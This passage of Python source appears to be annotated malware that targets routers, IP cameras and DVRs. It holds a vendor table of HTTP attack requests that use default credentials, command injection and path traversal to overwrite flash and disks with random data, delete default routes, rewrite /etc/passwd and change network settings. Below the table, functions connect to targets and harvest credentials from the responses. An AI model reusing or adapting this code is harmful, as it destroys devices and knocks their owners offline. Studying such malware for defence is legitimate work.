           'POST /Forms/rpAuth_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLoginPassword=ZyXEL+ZyWALL+Series&hiddenPassword=21232f297a57a5a743894a0e4a801fc3&Prestige_Login=Login',
           ],
          ['realtron', '401.*Server:Realtron WebServer.*Basic realm=index.htm',
           'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',
           'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',
           ],
          ['supernet', '401 Unauthorized.*realm=ADSL Modem.*Server: WebServer/1.0',
           'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',
           'POST /Forms/home_lan_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nuiViewIPAddr=10.%%RAND8%%&dhcpFlag=0&ipAddrMain=10.%%RAND8%%&uiViewNetMask=255.255.255.0&uiViewIPAddr2=0.0.0.0&ipAddrAlias=0.0.0.0&uiViewNetMask2=0.0.0.0&MorAFlag=0&lan_RIPVersion=RIP1&lan_RIPDirection=None&lan_IGMP=Disabled&igmp_snoop_act=0&mld_snoop_act=0&dhcpTypeRadio=0&lan_IPv6RadvdEnable=0&lan_IPv6RadvdMode=0&lan_IPv6AutoPrefix=0&lan_Ipv6Address0=2005%3A%3A&lan_Ipv6Address1=64&lan_Ipv6PreLifetime=604800&lan_IPv6ValidLifetime=2592000&lan_ManagedAddr=on&lan_OtherConfig=on&lan_IPv6DHCP6Server=0&lan_IPv6DHCP6Mode=0&lan_Ipv6DHCP6Address0=%3A%3A&lan_Ipv6DHCP6Address1=0&lan_Ipv6DHCP6PreLifetime=0&lan_IPv6DHCP6ValidLifetime=0&lan_IPv6DHCP6DNSServer1=%3A%3A&lan_IPv6DHCP6DNSServer2=%3A%3A',
           ],
          ['pldtmydsl', '^(49\.14[456789]|49\.15[01]|58\.69|112\.20[0-9]|112\.21[01]|119\.9[2345]|122\.[23]|122\.5[2345]|124\.10[4567])\.\d+\.\d+%%%.*200 Ok.*Server: microhttpd.*no-cache.*/index.html',
           'POST /login/login-page.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nAuthName=admin&AuthPassword=1234',
           'GET /index.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: SESSION=%%CUSTOM1%%\r\nReferer: http://%%TARGETIP%%/login/login-page.cgi\r\n\r\n',
           ],
          ['pldtfibr', '302 Redirect.*GoAhead-Webs.*PeerSec-MatrixSSL.*1.1/login.html',
           'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=adminpldt\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=adminpldt&Passwd=0123456789',
           'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=adminpldt\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=adminpldt&Passwd=1234567890',
           ],
          ['foscamold', 'Server: Netwave IP Camera',
           'GET /camera_control.cgi?param=1&user=admin&pwd=&value=0 HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
           'GET /camera_control.cgi?param=2&user=admin&pwd=&value=0 HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
           ],
          ['telkomdlink', '^(105\.18[4567]|105\.22[456789])\.\d+\.\d+%%%.*Server: microhttpd.*Set-Cookie: Name=;',
           'POST /index.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nusername=support&password=TelkomDlink12345&validateCode=',
           'GET /internet.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\n\r\n',
           ],
          ['aztechweb', 'K;Content-type: text/html;charset=ISO-8859-1.*domtabadv\.css',
           'GET /cgi-bin/login.cgi?username=admin&password=admin HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
           'GET /cgi-bin/login.cgi?username=admin&password=bayandsl HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
           ],
          ['netgeardgn1022', '(NETGEAR DGN1000|NETGEAR DGN2200)',
           'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/dev/urandom+>/dev/root&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n',
           'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=route+del+default&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n',
           ],
          ['netgearr7064', '(NETGEAR R7000|NETGEAR R6400)',
           'GET /cgi-bin/;cat$IFS/dev/urandom$IFS>/dev/root HTTP/1.0\r\n\r\n',
           'GET /cgi-bin/;route$IFSdel$IFSdefault HTTP/1.0\r\n\r\n',
           ],
          ['vacron', '(VACRON NVR|Boa.*title>DVR LOGIN<\/ti)',
           'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock0 HTTP/1.0\r\n\r\n',
           'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock9 HTTP/1.0\r\n\r\n',
           ],
          ['jaws', 'Server: JAWS',
           'GET /shell?cat%20/dev/urandom%20%3E/dev/sda1 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
           'GET /shell?cat%20/dev/urandom%20%3E/dev/sda2 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
           ],
          ['readynas', 'Apache.*Debian.*Location:\shttp:\S+/admin;Vary',
           'GET / HTTP/1.0\r\n\r\n',
           ],
          ['mediatekajax', 'Server: lighttpd/1.*style\.css.*ion\sinit\(\).*ion\sfFOB\(o\).*',
           'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=admin&UI_ADMIN_PASSWORD=admin',
           'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=admin&UI_ADMIN_PASSWORD=admin123',
           ],
          ['mediatekwimax', '302 Found.*Server: httpd.*Location: login.html',
           'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=admin&PASSWORD=admin',
           'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=user&PASSWORD=user',
           ],
          ['mediatekrpc', '302 Found.*Server: httpd.*Location: login\.asp',
           'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=admin&PASSWORD=admin&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
           'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=user&PASSWORD=user&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
           ],
          ['mdmweb', 'Server: lighttpd.*xmlns=.*;<title></title>;.*href=include/style.css',
           'POST /cgi-bin/qcmap_auth HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntype=login&pwd=21232f297a57a5a743894a0e4a801fc3&timeout=300&user=admin',
           'POST /cgi-bin/qcmap_auth HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntype=login&pwd=admin&timeout=300&user=admin',
           ],
          ['airosfile', 'Cookie: AIR',
           'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../etc/passwd"\r\n\r\ntest:D/jrO7OLO39l.:0:0:Administrator:/etc/persistent:/bin/sh\r\n--XXX--\r\n',
           'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../dev/mtdblock5"\r\n\r\nUBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI NETWORKS UBRICKUITI \r\n--XXX--\r\n',
           ],
          ['xionghash', 'Server: uc-httpd',
           'GET ../../../../../mnt/mtd/Config/Account1 HTTP/1.0\r\n\r\n',
           'xtsxpand:iris_small:1',
           ],
          ['hnap', '(HTTP|HTML|html)',
           'GET /HNAP1/ HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
           'hnapxpand:admin/admin:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
           ]
          ]

O0O = "SPLTX"  # Not visibly used in this code.

time.sleep(1)

# Edit hnapxpand (Linksys), and xtspand and xnraxpand (Dahua?) requests to
# include target IP, body length, and  base64 encoding of authorization.
for idx_devices in range(len(cmd_HTTP)):
    for idx_requests in range(len(cmd_HTTP[idx_devices])):
        regresult = re.search('hnapxpand:([^:/]*)/([^:]*):([^:]+):([^:]+):(.*)$', cmd_HTTP[idx_devices][idx_requests])

        if regresult:
            cmd_HTTP[idx_devices][idx_requests] = 'POST /HNAP1/ HTTP/1.0\r\nAuthorization: Basic %s\r\nContent-Type: text/xml; charset="utf-8"\r\nSOAPAction: http://purenetworks.com/HNAP1/%s\r\nContent-Length: %%%%BODYLENGTH%%%%\r\n\r\n<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><soap:Body><%s xmlns="http://purenetworks.com/HNAP1/">%s</%s></soap:Body></soap:Envelope>' % (binascii.b2a_base64('%s:%s' % (regresult.group(1), regresult.group(2))).strip(), regresult.group(3), regresult.group(4), regresult.group(5), regresult.group(4))
        regresult = re.search('xtsxpand:([^:]+):(\d+)', cmd_HTTP[idx_devices][idx_requests])

        if regresult:
            cmd_HTTP[idx_devices][idx_requests] = 'POST /dvrcmd HTTP/1.1\r\nHost: %%%%TARGETIP%%%%\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: %%%%BODYLENGTH%%%%\r\n\r\nTSCommand=ptz_req&req=start&param=%s&channel=%s&stream=1' % (regresult.group(1), regresult.group(2))
        regresult = re.search('xnrxpand:([^:]+):(\d+)', cmd_HTTP[idx_devices][idx_requests])

        if regresult:
            cmd_HTTP[idx_devices][idx_requests] = 'POST /dvrcmd HTTP/1.1\r\nHost: %%%%TARGETIP%%%%\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: %%%%BODYLENGTH%%%%\r\n\r\ncommand=ptz_req&req=start&param=%s&channel=%s&stream=1' % (regresult.group(1), regresult.group(2))
time.sleep(1)

# List of active socket connections to HTTP targets. Items are socket.socket()
# objects.
HTTPtargets_s = []

# Dictionary of target information. Keys are hash(socket.socket()) objects.
# Values are (targetip, int(targetport), request).
HTTPtargets_targets = {}

# Dictionary of job hashes. Keys are hash(sock.sock()). Values are job hashes.
jobhashes = {}

# Dictionary of HTTP response from target. Keys are hash(sock.sock()). Values
# are HTTP response text.
http_response = {}

# Dictionary denoting whether GET request was sent. Keys are
# hash(sock.socket()).
HTTP_reqsent = {}

# Dictionary of GET requests to send to target host. Keys are
# hash(socket.socket()). Values are text for GET requests to be sent.
HTTPtargets_requests = {}


# Dictionary of times when GET requests are sent to the target host. Keys are
# hash(socket.socket()). Values are times when HTPT requests were last sent to
# the target.
HTTP_reqtimes = {}

# List of HTTP target hashes. Items are hash(targetip, int(targetport)).
HTTP_hashes = []

# List of HTTP target information. Keys are hash(targetip, int(targetport)).
# Values are (targetip, int(targetport), bannerhint)
target_ipportbann = {}

# Dictionary of time until connection to HTTP targets. Keys are
# hash((targetip, int(targetport)). Values are times to connect to target.
HTTP_waittime = {}

# Dictionary of time until connection to HTTP targets. Keys are
# hash((targetip, int(targetport)). Values are sock.sock() objects.
HTTP_connsock = {}

# Dictionary of OEMs. Keys are hash(sock.sock()). Values are OEM.
target_OEM = {}

# Dictionary of HTTP attack trials. Keys are hash(targetip, int(targetport)).
# Values are number of times penetrations have been attempted.
HTTP_tries = {}

# Dictionary of GET requests sent to target hosts. Keys are
# hash(targetip, int(targetport)). Values are command GET requests taken from
# cmd_HTTP.
HTTP_cmdrequests = {}

# Dictionary of login hints. Keys are hash(targetip, int(targetport)). Values
# are login hints.
HTTPtargets_loginhint = {}

# Dictionary of password hints. Keys are hash(targetip, int(targetport)). Values
# are password hints.
HTTPtargets_passhint = {}

# Dictionary of random passwords, generated as 8 random of lower and upper case
# letters, and numbers, where each number is 3x more likely than a letter.
randpass = {}

# Dictinoary of base64 encode user:passes. Keys are
# hash(targetip, int(targetport)). Values are base64 encoding of user:pass
# pairs.
b64userpass = {}

# Dictionary of session IDs to submit to HTTP targets. Keys are job hashes.
# Values are SESSION IDs used in HTTP requests.
sessid = {}

# Dictionary of SSIDs to submit to HTTP targets. Keys are job hashes.
# Values are SSIDs used in HTTP requests.
ssid = {}

# Dictionary of authority types to submit to HTTP targets. Keys are job hashes.
# Values are authority types used in HTTP requests.
authtype = {}

# Dictionary containing initial line of HTTP response. Keys are
# hash(sock.sock()). Values are first line from http_response.
http_response_init = {}

# Dictionary indicating whether HTTP connections have active timeouts. Keys are
# hash(targetip, int(targetport)). Values are 0 or 1.
HTTP_timeout = {}


def initHTTPtarget(targetip, targetport, bannerhint, loginhint='',
                   passwordhint=''):
    """
    This function initializes a new target host for HTTP attacks, adding them
    to list and dictionaries such as HTTPtargets_passhint, etc.

    Inputs:
         targetip: IP of target host.
         targetport: Port of connection.
         bannerhint: Banner hint for target host.
         loginhint: Login (ie username) hint for target host.
         passwordhint: Password hint for target host.

    Outputs:
        Lists, dictionaries such as target_ipportbann, HTTPtargets_loginhint,
        etc. will be initialized or the target host will be added.

    Returns:
        None.
    """

    global cmd_HTTP
    global config_eWP

    if not config_eWP:
        return

    s_target = (targetip, int(targetport))
    targethash = hash(s_target)

    if targethash in HTTP_hashes:
        return

    cmd_OEM = ''  # cmd_OEM for HTTP type attacks?
    cmd_requests = []
    # credential[0] = cmd_HTTP OEM.
    # credential[1] = cmd_HTTP banner hint.
    # credential[2:] = cmd_HTTP requests.
    for credential in cmd_HTTP:
        if re.search(credential[1], bannerhint):
            cmd_OEM = credential[0]
            cmd_requests = credential[2:]
            break

    if not cmd_OEM:
        return

    HTTP_tries[targethash] = 0
    HTTP_cmdrequests[targethash] = cmd_requests
    target_OEM[targethash] = cmd_OEM

    target_ipportbann[targethash] = (targetip, int(targetport), bannerhint)
    HTTP_waittime[targethash] = 0
    HTTP_connsock[targethash] = None
    HTTPtargets_loginhint[targethash] = loginhint
    HTTPtargets_passhint[targethash] = passwordhint
    randpass[targethash] = ""
    b64userpass[targethash] = ""
    sessid[targethash] = ""
    ssid[targethash] = ""
    authtype[targethash] = ""
    HTTP_timeout[targethash] = 0
    HTTP_hashes.append(targethash)


def HTTP_connect(targetip, targetport, request, jobhash):
    """
    This function connects to an HTTP target and returns the socket object
    for it.

    Inputs:
        targetip: IP address of target host.
        targetport: Port of target host.
        request: HTTP requests to be sent to target.

    Outputs:
        Updates lists and dictionaries such as HTTP_targets_s[], HTTP_reqsent[],
        etc.

    Returns:
        Socket.socket() object to target host.
    """

    s_target = (targetip, int(targetport))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)

    try:
        s.connect(s_target)
    except:
        pass

    sockhash = hash(s)
    HTTPtargets_s.append(s)
    HTTPtargets_targets[sockhash] = (targetip, int(targetport), request)
    HTTP_reqsent[sockhash] = 0
    HTTPtargets_requests[sockhash] = request
    http_response[sockhash] = ''
    HTTP_reqtimes[sockhash] = time.time()
    jobhashes[sockhash] = jobhash
    HTTP_connsock[jobhash] = s
    http_response_init[jobhash] = ''

    return s


def HTTP_reset(webhash):
    """
    This function resets target host settings, after all of a host target's
    requests have been sent.

    Inputs:
        webhash: hash(hash(targetip, int(targetport))?

    Outputs:
        After reset, lists and dictionaries for target hosts such as HTTP_tries,
        HTTP_cmdrequests are reset.

    Returns:
        None.
    """

    global config_sWP

    if (webhash in target_OEM and
        target_OEM[webhash] == 'hnap' and
        HTTPtargets_passhint[webhash] == ''
        ):
        pass
    else:
        if webhash in target_OEM and target_OEM[webhash] != '' and config_sWP:
            # Prepend random password to first line of HTTP response.
            if randpass[webhash]:
                http_response_init[webhash] = randpass[webhash] + ':' + \
                                              http_response_init[webhash]

            # Print IP, port,
            printstatus("%s:%d WP:%s:%s/%s:%s" % (
                                                  target_ipportbann[webhash][0],
                                                  target_ipportbann[webhash][1],
                                                  target_OEM[webhash],
                                                  HTTPtargets_loginhint[webhash],
                                                  HTTPtargets_passhint[webhash],
                                                  http_response_init[webhash]
                                                  )
                        )

    if (webhash in target_OEM and
        target_OEM[webhash] == 'xionghash' and
        HTTPtargets_passhint[webhash] != ''
        ):
        init_webtarget(target_ipportbann[webhash][0], int(target_ipportbann[webhash][1]))
        stage_credentials(target_ipportbann[webhash][0], 9527, 'PORT:9527:')

    HTTP_tries[webhash] = None
    HTTP_cmdrequests[webhash] = None
    target_ipportbann[webhash] = None
    HTTP_waittime[webhash] = None
    HTTP_connsock[webhash] = None
    target_OEM[webhash] = None
    HTTPtargets_loginhint[webhash] = None
    HTTPtargets_passhint[webhash] = None
    randpass[webhash] = None
    b64userpass[webhash] = None
    sessid[webhash] = None
    ssid[webhash] = None
    authtype[webhash] = None
    HTTP_timeout[webhash] = None
    HTTP_hashes.remove(webhash)


def convert_chars(f):
    """
    This function converts string of hex values into ASCII characters.

    Inputs:
        f: String to be converted into characters.

    Outputs:
        None.

    Returns:
        Character string.
    """

    returnchars = bytearray()
    idx = 0

    while idx < len(f):
        fchar = f[idx]
        if fchar is None or fchar == '\0':
            return str(returnchars)
        else:
            returnchars.append(fchar)
        idx += 1


def request_contentdisp(boundary, vals):
    """
    This function creates parts for a multipart form-data HTTP request.
    Note that this function is not visibly called in this code.

    Inputs:
        boundary: Boundary parameter for multipart request.
        vals: List of values to form-data, where each item is a two-item list
              composed of the name of the form-data, and the value for the
              part.

    Outputs:
        None.

    Returns:
        Text for the content of the request.
    """

    returncontent = ''

    for val in vals:
        returncontent += boundary + '\r\n'
        returncontent += 'Content-Disposition: form-data; name="' + \
                      val[0] + '"\r\n\r\n' + val[1] + '\r\n'
    returncontent += boundary + '--\r\n'

    return returncontent


def HTTP_sendrequests(sock):
    """
    This function prepares and sends GET requests to a target host from
    http_response.

    Inputs:
        sock: Socket.socket() object of target host.

    Outputs:
        After sending the payload, the target is cleared from lists such as
        HTTPtargets_s, HTTP_reqsent, http_response, etc.

    Returns:
        None.
    """

    global webclient_maxattempts
    global HTTP_wait
    global HTTP_wait_timeout

    s_hash = hash(sock)
    jobhash = jobhashes[s_hash]

    if not HTTP_timeout[jobhash]:
        try:
            sock.close()
        except:
            pass
    else:
        print("Debug: Skipping sock close due to keepalive")
        pass

    ssid_active = 0

    http_response_init[jobhash] = ''
    try:
        http_response_init[jobhash] = http_response[s_hash].split('\n')[0].strip()
    except:
        pass

    cmd_OEM = target_OEM[jobhash]

    if cmd_OEM == 'kguard':
        if HTTP_tries[jobhash] == 0:
            if not 'MCTP/1.0 2' in http_response[s_hash]:
                HTTP_tries[jobhash] = 99
            else:
                HTTPtargets_loginhint[jobhash] = 'xesp'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'hnap':
        if HTTP_tries[jobhash] == 0:
            if not 'purenetworks' in http_response[s_hash]:
                    HTTP_tries[jobhash] = 99
            else:
                    HTTPtargets_loginhint[jobhash] = 'n'
                    HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'avtech':
        if HTTP_tries[jobhash] == 0:

            username = ''
            password = ''
            for responses in http_response[s_hash].split():
                resp_pair = responses.split('=')
                if len(resp_pair) == 2:
                    if resp_pair[0] == 'Account.User1.Username':
                        username = resp_pair[1]
                    elif resp_pair[0] == 'Account.User1.Password':
                        password = resp_pair[1]
                        break
                    if resp_pair[0] == 'Account.User2.Username':
                        username = resp_pair[1]
                    elif resp_pair[0] == 'Account.User2.Password':
                        password = resp_pair[1]
                        break
                    if resp_pair[0] == 'Account.User3.Username':
                        username = resp_pair[1]
                    elif resp_pair[0] == 'Account.User3.Password':
                        password = resp_pair[1]
                        break

            if password == '':
                username = 'admin'
                password = 'admin'

            HTTPtargets_loginhint[jobhash] = username
            HTTPtargets_passhint[jobhash] = password
            b64userpass[jobhash] = binascii.b2a_base64('%s:%s' %
                                                       (username,
                                                        password)
                                                       ).strip()

        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'wificam':
        if HTTP_tries[jobhash] == 0:
            try:
                respidx = http_response[s_hash].find('\x0a\x0a\x0a\x0a\x01')
                username = ''
                password = ''
                if respidx >= 0:
                    respidx += (138 + 4)
                    username = convert_chars(http_response[s_hash]
                                             [respidx: respidx + 31])
                    password = convert_chars(http_response[s_hash]
                                             [respidx + 32:respidx + 63])
                    HTTP_tries[jobhash] += 1

                    HTTPtargets_loginhint[jobhash] = username
                    HTTPtargets_passhint[jobhash] = password
            except:
                pass

            HTTP_tries[jobhash] += 1

        elif HTTP_tries[jobhash] == 1:

            username = ''
            password = ''
            regresult = re.search('loginuser="([^"]+)";', http_response[s_hash])

            if regresult:
                username = regresult.group(1)

            regresult = re.search('loginpass="([^"]+)";', http_response[s_hash])

            if regresult:
                password = regresult.group(1)

            if (password == '' and
                    username == '' and
                    HTTPtargets_loginhint[jobhash] == ''
                ):
                username = "admin"
                password = "admin"

            if HTTPtargets_loginhint[jobhash] == '':
                HTTPtargets_loginhint[jobhash] = username
            if HTTPtargets_passhint[jobhash] == '':
                HTTPtargets_passhint[jobhash] = password

            HTTP_tries[jobhash] += 1

        elif HTTP_tries[jobhash] >= 2:
            HTTP_tries[jobhash] += 1

    if cmd_OEM == 'homestation':
        if HTTP_tries[jobhash] <= 0:
            sessionid = re.search('sessionid\'\s*:\'(\S+)\'', http_response[s_hash])

            if sessionid:
                b64userpass[jobhash] = sessionid.group(1)
                HTTPtargets_loginhint[jobhash] = 'TelefonicaUser'
                HTTPtargets_passhint[jobhash] = 'user'
            else:
                if HTTP_tries[jobhash] >= 0:
                    HTTP_tries[jobhash] = 99

        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'observa':
        if HTTP_tries[jobhash] <= 0:

            sessionid = re.search('sessionid\'\s*:\'(\S+)\'',
                                  http_response[s_hash])
            username = re.search('username\'\s*:\'(\S+)\'',
                                 http_response[s_hash])
            password = re.search('password\'\s*:\'(\S+)\'',
                                 http_response[s_hash])

            if sessionid and username and password:
                b64userpass[jobhash] = sessionid.group(1)
                sessid[jobhash] = ''.join(random.choice('0123456789')
                                          for i in range(8))
                ssid[jobhash] = ''
                HTTPtargets_loginhint[jobhash] = username.group(1)
                HTTPtargets_passhint[jobhash] = password.group(1)
            else:
                if HTTP_tries[jobhash] >= 0:
                    HTTP_tries[jobhash] = 99
        else:
            regresult = re.search('G_Conns\S+\s+=\s+\"(\S+)\"\;\s+\S*Username',
                                 http_response[s_hash])
            if regresult:
                authtype[jobhash] = regresult.group(1)
                regresult = re.search('\d+@(\S+)', authtype[jobhash])
                if regresult:
                    ssid[jobhash] = sessid[jobhash] + '%40' + \
                                             regresult.group(1)
                else:
                    ssid[jobhash] = authtype[jobhash]
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'hg532':
        if HTTP_tries[jobhash] <= 3:
            if 'SessionID_R3=' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    sessid[jobhash] = 'OGM2OTc2ZTViNTQxMDQxNWJkZTkwOGJkNGRlZTE1ZGZiMTY3YTljODczZmM0YmI4YTgxZjZmMmFiNDQ4YT%3D%3D'
                    ssid[jobhash] = ''
                    HTTP_tries[jobhash] = 3
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'instalador'
                    HTTPtargets_passhint[jobhash] = '.corpora'
                    sessid[jobhash] = 'N2MwNGQxMzUzNzI1Y2ZkNzU4ZTFhYzNjM2JjZGRiMDkxNWNlNzA4OWU1NTlkODQ0Yjk2YTU4MjFmNTM1N2%3D%3D'
                    ssid[jobhash] = 'CNT_ES_'
                    HTTP_tries[jobhash] = 3
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'instalador'
                    HTTPtargets_passhint[jobhash] = 'cnt2016a'
                    sessid[jobhash] = 'NjQzMGU0ZDBhMTMyYzI5Njg4NGUzMjNlOWJkMWM1MzJhODZmYmQ3OWJlYmUxN2U0Nzc1NDlmZjBkYjM0Yz%3D%3D'
                    ssid[jobhash] = 'CNT_ES_'
                    HTTP_tries[jobhash] = 3
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    sessid[jobhash] = 'YWRtaW4%3D'
                    ssid[jobhash] = ''
                    HTTP_tries[jobhash] = 3
            else:
                if HTTP_tries[jobhash] == 2:
                    HTTP_waittime[jobhash] = time.time() + 65
                if HTTP_tries[jobhash] >= 3:
                    HTTP_tries[jobhash] = 99

        regresult = re.search('SessionID_R3=([a-zA-Z0-9]+)',
                              http_response[s_hash])

        if regresult:
            b64userpass[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'hg532a':
        if HTTP_tries[jobhash] <= 0:
            if 'sessionID=' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    sessid[jobhash] = 'YWRtaW4='
                    ssid[jobhash] = ''
                    HTTP_tries[jobhash] = 0
            else:
                HTTP_tries[jobhash] = 99

        regresult = re.search('sessionID=([a-zA-Z0-9]+)',
                              http_response[s_hash]
                              )

        if regresult:
            b64userpass[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'hg532a':
        if HTTP_tries[jobhash] <= 0:
            if 'sessionID=' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    sessid[jobhash] = 'YWRtaW4='
                    ssid[jobhash] = ''
                    HTTP_tries[jobhash] = 0
                else:
                    HTTP_tries[jobhash] = 99

        regresult = re.search('sessionID=([a-zA-Z0-9]+)', http_response[s_hash])

        if regresult:
            b64userpass[jobhash] = regresult.group(1)

        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'zxdsl831':
        if HTTP_tries [jobhash] <= 1:
            if 'vpivci.cgi' in http_response[s_hash]:
                HTTPtargets_loginhint[jobhash] = 'n'
                HTTPtargets_passhint[jobhash] = 'a'
                HTTP_tries[jobhash] = 1
            else:
                if HTTP_tries[jobhash] >= 1:
                      HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'engenius':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'crossweb':

        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'hanbang':
        if HTTP_tries[jobhash] > 0 and HTTP_tries[jobhash] <= 5:

            if 'Value>200</status' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '8888'
                    b64userpass[jobhash] = 'YWRtaW46ODg4ODg4'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
